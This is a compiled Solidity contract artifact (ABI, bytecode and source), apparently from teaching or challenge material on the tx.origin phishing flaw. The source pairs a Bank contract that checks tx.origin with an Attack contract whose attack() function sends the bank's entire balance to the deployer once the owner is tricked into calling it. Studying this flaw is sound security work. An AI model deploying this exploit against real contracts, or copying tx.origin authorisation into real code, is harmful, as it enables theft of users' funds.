{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract Bank",
          "name": "_bank",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "hacker",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516103a63803806103a6833981810160405281019061003291906100ce565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610152565b6000815190506100c88161013b565b92915050565b6000602082840312156100e057600080fd5b60006100ee848285016100b9565b91505092915050565b60006101028261011b565b9050919050565b6000610114826100f7565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b61014481610109565b811461014f57600080fd5b50565b610245806101616000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806338d1af2d1461003b5780639e5faafc14610059575b600080fd5b610043610063565b604051610050919061018f565b60405180910390f35b610061610087565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16316040518363ffffffff1660e01b815260040161013d9291906101aa565b600060405180830381600087803b15801561015757600080fd5b505af115801561016b573d6000803e3d6000fd5b50505050565b61017a816101d3565b82525050565b61018981610205565b82525050565b60006020820190506101a46000830184610171565b92915050565b60006040820190506101bf6000830185610171565b6101cc6020830184610180565b9392505050565b60006101de826101e5565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600081905091905056fea2646970667358221220d96a0c3869315876d35e434474c19841aa0a20ac06a07187ea417ab9e13ffaa264736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\ncontract Bank {\r\n    address public owner;//记录合约的拥有者\r\n\r\n    //在创建合约时给 owner 变量赋值\r\n    constructor() payable {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function transfer(address payable _to, uint _amount) public {\r\n        //检查消息来源 ！！！ 可能owner会被诱导调用该函数，有钓鱼风险！\r\n        require(tx.origin == owner, \"Not owner\");\r\n        //转账ETH\r\n        (bool sent, ) = _to.call{value: _amount}(\"\");\r\n        require(sent, \"Failed to send Ether\");\r\n    }\r\n}\r\ncontract Attack {\r\n    // 受益者地址\r\n    address payable public hacker;\r\n    // Bank合约地址\r\n    Bank bank;\r\n\r\n    constructor(Bank _bank) {\r\n        //强制将address类型的_bank转换为Bank类型\r\n        bank = Bank(_bank);\r\n        //将受益者地址赋值为部署者地址\r\n        hacker = payable(msg.sender);\r\n    }\r\n\r\n    function attack() public {\r\n        //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中\r\n        bank.transfer(hacker, address(bank).balance);\r\n    }\r\n}",
  "sourcePath": "D:\\workPlace\\任务\\9月\\题目修改\\Attack\\TxOrigin\\contracts\\Bank.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2023-09-11T07:07:04.822Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}